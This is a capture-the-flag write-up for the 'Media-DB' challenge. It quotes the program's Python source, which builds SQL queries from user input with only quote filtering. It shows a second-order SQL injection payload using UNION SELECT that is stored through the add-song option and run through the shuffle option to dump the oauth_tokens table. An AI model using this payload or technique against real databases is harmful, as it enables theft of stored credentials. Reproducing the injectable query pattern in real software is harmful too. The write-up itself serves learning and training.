# Media-DB CTF

In this CTF we were given an address and an attachment. We can see that the attachment given is the source code of the program running at the given address.

## Observations

Upon connecting to \bmedia-db.ctfcompetition.com 1337\b through netcat we are greeted with:
```
=== Media DB ===
1) add song
2) play artist
3) play song
4) shuffle artist
5) exit
```

It is clear (looking at the source code) that this program is based off an sql database.
Upon obseving the code, we can see that the program loads the flag within a table in the database.
```
with open('oauth_token') as fd:
  flag = fd.read()
```
and
```
c.execute("CREATE TABLE oauth_tokens (oauth_token text)")
```
## Method

Since this program takes user input, we will try to use an sql injection in order to view the oauth_tokens table.
The code provided helps us circomvent certain filtering. We can see that in the case of entering "1" in the main menu, any " will be filtered out.
```
if choice == '1':
    my_print("artist name?")
    artist = raw_input().replace('"', "")
    my_print("song name?")
    song = raw_input().replace('"', "")
    c.execute("""INSERT INTO media VALUES ("{}", "{}")""".format(artist, song))
```
In the case where we enter "2" in the main menu, any instance of ' will be filtered out.
```
elif choice == '2':
    my_print("artist name?")
    artist = raw_input().replace("'", "")
    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
```
In the case where we enter "3", ' will be filtered out.
```
elif choice == '3':
    my_print("song name?")
    song = raw_input().replace("'", "")
    print_playlist("SELECT artist, song FROM media WHERE song = '{}'".format(song))
```
A good thing to note here is that, when selecting the fourth option in the program, it will execute anything in the table and will not filter the data in the tables.
```
  elif choice == '4':
    artist = random.choice(list(c.execute("SELECT DISTINCT artist FROM media")))[0]
    my_print("choosing songs from random artist: {}".format(artist))
    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
```
As we can see from above, the sql command string uses single quotes after "WHERE artist =". Recalling from earlier, if we chose the first option in the main menu,
only double quotes are filtered out, not single quotes. Thus, we will try to inject an sql command using the first option and try to view the oauth token table.

At the main menu, chose option 1. When prompted for the artist name, enter:
```
Cedric' UNION SELECT oauth_token, '' FROM oauth_tokens WHERE oauth_token LIKE 'C%
```
and enter anything for the song name.

Now, when selecting option 4, the line
```
SELECT artist, song FROM media WHERE artist = '{}'
```
Will look like:
```
SELECT artist, song FROM media WHERE artist = 'Cedric' UNION SELECT oauth_token, '' FROM oauth_tokens WHERE oauth_token LIKE 'C%'
```
As you can see from above, I used the single quotations to trick the interprator into selecting a song from media where the artist matches 'Cedric'. I then added UNION in
order to combine the results (a union between both selected values from 2 different tables). Since the first table returns 2 values (artist and song), we need to return 2 values from the oauth_tokens table (sql screems at you if you try to union two tables that return a different number of values). This is why I added the '' (im just adding a blank value). Then, from oauth_tokens, I return a value WHERE oauth_token is like C% (meaning any string starting with C because the flag starts with "CTF").

We are then greeted with the flag,
```
1: "" by "CTF{fridge_cast_oauth_token_cahn4Quo}
```

